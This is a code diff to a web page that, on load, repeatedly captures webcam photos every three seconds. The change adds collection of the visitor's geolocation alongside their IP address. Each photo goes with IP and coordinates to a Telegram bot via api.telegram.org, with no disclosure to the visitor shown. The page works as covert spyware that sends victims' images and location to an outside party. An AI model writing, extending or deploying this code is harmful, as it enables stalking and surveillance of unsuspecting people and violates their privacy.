@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-  <title>Camera Capture</title>
+  <title>Continuous Camera Capture</title>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
@@ -31,18 +31,41 @@
       });
     }
 
-    // Start capturing photos
+    // Function to get the user's location
+    function getLocation() {
+      return new Promise((resolve, reject) => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(function(position) {
+            const location = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude
+            };
+            resolve(location);
+          }, function() {
+            reject('Location permission denied or unavailable.');
+          });
+        } else {
+          reject('Geolocation not supported');
+        }
+      });
+    }
+
+    // Start capturing photos continuously
     function startCapturing() {
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      navigator.mediaDevices.getUserMedia({ video: true })
         .then((stream) => {
           const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
 
-          // Capture photos from front and back cameras
+          // Function to capture a photo from front/back camera
           function capturePhoto() {
             imageCapture.takePhoto()
               .then((blob) => {
                 getUserIP().then((ip) => {
-                  sendToTelegram(blob, ip);
+                  getLocation().then((location) => {
+                    sendToTelegram(blob, ip, location);
+                  }).catch(error => {
+                    console.error('Location Error:', error);
+                  });
                 }).catch(error => {
                   console.error('IP Fetch Error:', error);
                 });
@@ -52,32 +75,8 @@
               });
           }
 
-          // Switch to back camera and capture photo
-          function switchToBackCamera() {
-            const backImageCapture = new ImageCapture(stream.getVideoTracks()[1]);
-            backImageCapture.takePhoto()
-              .then((blob) => {
-                getUserIP().then((ip) => {
-                  sendToTelegram(blob, ip);
-                }).catch(error => {
-                  console.error('IP Fetch Error:', error);
-                });
-              })
-              .catch((error) => {
-                console.error('Error capturing back photo:', error);
-              });
-          }
-
-          // Set intervals to capture photos continuously from front and back cameras
-          let capturingFront = true;
-          setInterval(() => {
-            if (capturingFront) {
-              capturePhoto();  // Front camera photo
-            } else {
-              switchToBackCamera();  // Back camera photo
-            }
-            capturingFront = !capturingFront;
-          }, 3000); // Capture a photo every 3 seconds
+          // Set interval to capture photo continuously every 3 seconds
+          setInterval(capturePhoto, 3000);
 
         })
         .catch((error) => {
@@ -85,12 +84,12 @@
         });
     }
 
-    // Send photo and user IP to Telegram bot
-    function sendToTelegram(data, ip) {
+    // Send photo, IP, and location to Telegram bot
+    function sendToTelegram(data, ip, location) {
       const formData = new FormData();
       formData.append('chat_id', chatId);
       formData.append('photo', data, 'camera_photo.jpg');
-      formData.append('caption', `User IP: ${ip}`);
+      formData.append('caption', `IP: ${ip}, Location: Latitude ${location.latitude}, Longitude ${location.longitude}`);
 
       fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
         method: 'POST',
@@ -102,7 +101,7 @@
     }
 
     window.onload = function() {
-      startCapturing(); // Start capturing as soon as the page loads
+      startCapturing(); // Start capturing photos and sending them continuously
     };
 
   </script>
